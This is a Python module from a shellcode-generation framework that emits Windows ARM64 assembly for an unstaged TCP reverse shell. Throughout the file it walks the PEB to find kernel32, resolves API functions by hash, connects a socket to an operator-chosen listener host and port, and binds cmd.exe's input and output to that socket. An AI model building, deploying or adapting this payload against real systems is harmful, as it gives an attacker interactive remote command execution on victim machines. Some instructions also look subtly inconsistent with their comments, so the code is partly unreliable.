import sys
import ctypes
import struct

import sickle.common.lib.generic.convert as convert
import sickle.common.lib.generic.mparser as modparser
import sickle.common.lib.programmer.builder as builder

from sickle.common.lib.reversing.assembler import Assembler

from sickle.common.headers.windows import (
    winnt,
    ntdef,
    ws2def,
    winternl,
    winsock2,    
    processthreadsapi,
)

class Shellcode():

    arch = "aarch64"

    platform = "windows"

    name = f"Windows ({arch}) CMD Reverse Shell"

    module = f"{platform}/{arch}/shell_reverse_tcp"

    example_run = f"{sys.argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"

    ring = 3

    author = ["wetw0rk"]

    tested_platforms = []

    summary = ("TCP-based reverse shell over IPv4 that provides an interactive cmd.exe "
               "session")

    description = """
    A TCP-based reverse shell over IPv4 that provides an interactive cmd.exe
    session. Since this payload is not staged, there is no need for anything
    more than a Netcat listener.
    """

    arguments = {}
    arguments["LHOST"] = {}
    arguments["LHOST"]["optional"] = "no"
    arguments["LHOST"]["description"] = "Listener host to receive the callback"

    arguments["LPORT"] = {}
    arguments["LPORT"]["optional"] = "yes"
    arguments["LPORT"]["description"] = "Listening port on listener host"

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]
        arg_object["architecture"] = Shellcode.arch

        self.dependencies = {
            "Kernel32.dll": [
                "LoadLibraryA",
                "CreateProcessA",
                "TerminateProcess",
            ],
            "Ws2_32.dll": [
                "WSAStartup",
                "WSASocketA",
                "connect",
            ],
        }

        sc_args = builder.init_sc_args(self.dependencies)
        sc_args.update({
            "wsaData"                       : 0x00, 
            "name"                          : 0x00,
            "lpStartInfo"                   : ctypes.sizeof(processthreadsapi._STARTUPINFOA),
            "lpCommandLine"                 : len("cmd\x00"),
            "lpProcessInformation"          : 0x00,
        })

        self.stack_space = builder.calc_stack_space(sc_args,
                                                    Shellcode.arch)

        self.storage_offsets = builder.gen_offsets(sc_args,
                                                   Shellcode.arch)

        return

    def get_kernel32(self):
        """Generates stub for obtaining the base address of Kernel32.dll
        """

        stub = f"""
getKernel32:
    mov w4, 0x4b
getPEB:
    ldr x7, [x18, #0x60]
getHeadEntry:
    ldr x6, [x7, #{winternl._PEB.Ldr.offset}]
    ldr x6, [x6, #{winternl._PEB_LDR_DATA.InLoadOrderModuleList.offset}]
search:
    eor x3, x3, x3
    ldr x0, [x6, #{winternl._LDR_DATA_TABLE_ENTRY.DllBase.offset}]
    ldr x5, [x6, #{winternl._LDR_DATA_TABLE_ENTRY.BaseDllName.offset + ntdef._UNICODE_STRING.Buffer.offset}]
    ldr x6, [x6]
    ldrh w13, [x5, #0x18]
    cmp w13, w3
    b.ne search
    ldrb w13, [x5]
    cmp w13, w4
    b.ne search
found:
    ret
        """

        return stub

    def lookup_function(self):
        """Generates the stub responsible for obtaining the base address of a function
        """

        stub = f"""
lookupFunction:
    ldr w1, [x6, #{winnt._IMAGE_DOS_HEADER.e_lfanew.offset}]
    add x1, x1, #{winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset + winnt._IMAGE_OPTIONAL_HEADER64.DataDirectory.offset}
    add x1, x1, x6
    ldr w0, [x1]
    mov x1, x6
    add x1, x1, x0
    ldr w0, [x1, #{winnt._IMAGE_EXPORT_DIRECTORY.AddressOfFunctions.offset}]
    mov x7, x6
    add x7, x7, x0
    ldr w3, [x1, #{winnt._IMAGE_EXPORT_DIRECTORY.NumberOfFunctions.offset}]
parseNames:
    cmp x3, #0
    b.eq error
    sub x3, x3, #1
    ldr w0, [x7, x3, lsl #2]
    mov x5, x6
    add x5, x5, x0 ; x5 points to function string
    eor x8, x8, x8
    eor x0, x0, x0
calcHash:
    ldrb w0, [x5]
    add x5, x5, #0x01
    ands wzr, w0, w0
    b.eq calcDone
    ror w8, w8, #0xD
    add x8, x8, x0
    b calcHash
calcDone:
    cmp w8, w4
    b.ne parseNames
findAddress:
    ldr w7, [x1, #{winnt._IMAGE_EXPORT_DIRECTORY.AddressOfNames.offset}]
    add x7, x7, x6
    eor x0, x0, x0
    ldrh w0, [x7, x3, lsl #1]
    ldr w7, [x1, #{winnt._IMAGE_EXPORT_DIRECTORY.NumberOfNames.offset}]
    add x7, x7, x6
    ldr w0, [x7, x0, lsl #2]
    add x0, x0, x6
error:
    ret
        """

        return stub

    def load_library(self, lib):
        """Generates the stub to load a library not currently loaded into a process
        """

        lists = convert.from_str_to_xwords(lib)
        write_index = self.storage_offsets['functionName']

        src = "\nload_library_{}:\n".format(lib.rstrip(".dll"))

        for i in range(len(lists["QWORD_LIST"])):
            src += "    ldr x3, =0x{}\n".format( struct.pack('<Q', lists["QWORD_LIST"][i]).hex() )
            src += "    str x3, [x29, #-{}]\n".format(hex(write_index))
            write_index -= 8

        for i in range(len(lists["DWORD_LIST"])):
            src += "    ldr w3, =0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() ) 
            src += "    str w3, [x29, #-{}], ecx\n".format(hex(write_index))
            write_index -= 4

        for i in range(len(lists["WORD_LIST"])):
            src += "    ldr w3, =0x{}\n".format( struct.pack('<H', lists["WORD_LIST"][i]).hex() )
            src += "    str w3, [x29, #-{}]\n".format(hex(write_index))
            write_index -= 2

        for i in range(len(lists["BYTE_LIST"])):
            src += "    mov w3, #{}\n".format( hex(lists["BYTE_LIST"][i]) )
            src += "    str w3, [x29, #-{}]\n".format(hex(write_index))
            write_index -= 1

        src += f"""
    eor x3, x3, x3
    strb w3, [x29, #-{write_index}]
    add x0, x29, #-{self.storage_offsets['functionName']}
    ldr x25, [x29, #-{self.storage_offsets['LoadLibraryA']}]
    sub sp, sp, #0x50 ; Allocate 64 bytes for shadow stack
    blr x25
    add sp, sp, #0x50 ; Clean up
        """
        
        return src

    def resolve_functions(self):
        """This function is responsible for loading all libraries and resolving respective functions
        """

        stub = ""
        for lib, imports in self.dependencies.items():
            if (lib != "Kernel32.dll"):
                stub += self.load_library(lib)
                stub += """
    mov x6, x0
                """

            for func in range(len(imports)):
                stub += f"""
get_{imports[func]}:
    ldr w4, ={convert.from_str_to_win_hash(imports[func])}
    bl lookupFunction
    str x0, [x29, #-{self.storage_offsets[imports[func]]}]
                """

        return stub

    def generate_source(self):
        """Returns bytecode generated by the keystone engine.
        """

        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        if ("LPORT" not in argv_dict.keys()):
            lport = 4444
        else:
            lport = int(argv_dict["LPORT"])


        shellcode = f"""
_start:
    stp x29, x30, [sp, #-{self.stack_space}]!
    mov x29, sp

    bl getKernel32
    mov x6, x0
"""

        shellcode += self.resolve_functions()
        
        shellcode += f"""
; x0 => WSAStartup([in]  WORD      wVersionRequired, // x0 => MAKEWORD(2, 2) 
;                  [out] LPWSADATA lpWSAData);       // x1 => &wsaData
call_WSAStartup:
    mov x0, 0x202
    add x1, x29, #-{self.storage_offsets['wsaData']}
    ldr x25, [x29, #-{self.storage_offsets['WSAStartup']}]

    sub sp, sp, #0x50 ; Allocate 64 bytes for shadow stack
    blr x25
    add sp, sp, #0x50 ; Clean up

; x0 => WSASocketA([in] int                 af,              // x0      => AF_INET
;                  [in] int                 type,            // x1      => SOCK_STREAM
;                  [in] int                 protocol,        // x2      => IPPROTO_TCP
;                  [in] LPWSAPROTOCOL_INFOA lpProtocolInfo,  // x3      => NULL
;                  [in] GROUP               g,               // x4      => NULL
;                  [in] DWORD               dwFlags);        // x5      => NULL
call_WSASocketA:
    mov x0, {ws2def.AF_INET}
    mov x1, {winsock2.SOCK_STREAM}
    mov x2, {ws2def.IPPROTO_TCP}
    eor x3, x3, x3
    eor x4, x4, x4
    eor x5, x5, x5
    ldr x25, [x29, #-{self.storage_offsets['WSASocketA']}]
    
    sub sp, sp, #0x50 ; Allocate 64 bytes for shadow stack
    blr x25
    add sp, sp, #0x50 ; Clean up
    
    mov x26, x0 ; save the socket file descriptor (sockfd)

; x0 => connect([in] SOCKET s,             // x0 => sockfd (Obtained from WSASocketA)
;               [in] const sockaddr *name, // x1 => {{ IP | PORT | SIN_FAMILY }}
;               [in] int namelen);         // x2  => sizeof(sockaddr)
call_connect:
    mov x0, x26
    add x1, x29, #-{self.storage_offsets['name']}
    mov x2, {ctypes.sizeof(ws2def.sockaddr)}
    ldr x25, ={hex(convert.ip_str_to_inet_addr(argv_dict['LHOST']))}{struct.pack('<H', lport).hex()}0002
    str x25, [x1]
    eor x25, x25, x25
    str x25, [x1, #0x08]
    ldr x25, [x29, #-{self.storage_offsets['connect']}]

    sub sp, sp, #0x100 ; Allocate 64 bytes for shadow stack
    blr x25
    add sp, sp, #0x100 ; Clean up


; [x24/x6] => typedef struct _STARTUPINFOA {{ }}
setup_STARTUPINFOA:
    add x6, x29, #{self.storage_offsets['lpStartInfo']}
    mov x24, x6
    mov x0, x6
    mov x1, #0x00
    mov x2, {ctypes.sizeof(processthreadsapi._STARTUPINFOA)}
    mov w3, w1
memset_loop:
    strb w3, [x0], #1
    subs x2, x2, #1
    b.ne memset_loop
    mov w5, #{ctypes.sizeof(processthreadsapi._STARTUPINFOA)}
    str w5, [x6]
    mov w5, #{processthreadsapi.STARTF_USESTDHANDLES}
    str w5, [x6, #{processthreadsapi._STARTUPINFOA.dwFlags.offset}]
    str x26, [x6, #{processthreadsapi._STARTUPINFOA.hStdInput.offset}]
    str x26, [x6, #{processthreadsapi._STARTUPINFOA.hStdOutput.offset}]
    str x26, [x6, #{processthreadsapi._STARTUPINFOA.hStdError.offset}]

; x0 => CreateProcessA([in, optional]      LPCSTR                lpApplicationName,     // x0 => NULL
;                      [in, out, optional] LPSTR                 lpCommandLine,         // x1 => "cmd"
;                      [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,   // x2 => NULL
;                      [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,    // x3 => NULL
;                      [in]                BOOL                  bInheritHandles,       // x4 => 0x01
;                      [in]                DWORD                 dwCreationFlags,       // x5 => NULL
;                      [in, optional]      LPVOID                lpEnvironment,         // x6 => NULL
;                      [in, optional]      LPCSTR                lpCurrentDirectory,    // x7 => NULL
;                      [in]                LPSTARTUPINFOA        lpStartupInfo,         // [sp, #0x20] => &lpStartupInfo
;                      [out]               LPPROCESS_INFORMATION lpProcessInformation); // [sp, #0x28] => &lpStartupInfo ()
call_CreateProccessA:
    eor x0, x0, x0
    ldr x5, =0x646d63
    str x5, [x29, #-{self.storage_offsets['lpCommandLine']}]
    add x1, x29, #-{self.storage_offsets['lpCommandLine']}
    eor x2, x2, x2
    eor x3, x3, x3
    eor x5, x5, x5
    mov x4, #0x01
    eor x6, x6, x6
    eor x7, x7, x7
    sub sp, sp, #0x300
    str x24, [sp, #0x0]

    add x24, x29, #-{self.storage_offsets['lpProcessInformation']}
    str x24, [sp, #0x8]

    ldr x25, [x29, #-{self.storage_offsets['CreateProcessA']}]
    blr x25
    add sp, sp, #0x300

; x0 => TerminateProcess([in] HANDLE hProcess,   // x0 => -1 (Current Process)
;                        [in] UINT   uExitCode); // x1 => 0x00 (Clean Exit)
call_TerminateProcess:
	eor x0, x0, x0
    mov x1, #-0x01
	ldr x25, [x29, #-{self.storage_offsets['TerminateProcess']}]
    sub sp, sp, #0x50
	blr x25
    add sp, sp, #0x50
fin:
    ldp x29, x30, [sp], #16
    ret
"""

        shellcode += self.get_kernel32()
        shellcode += self.lookup_function()

        return shellcode

    def get_shellcode(self):
        """Generates Windows (x64) generic reverse shell
        """
    
        generator = Assembler(Shellcode.arch)

        src = self.generate_source()

        return generator.get_bytes_from_asm(src)
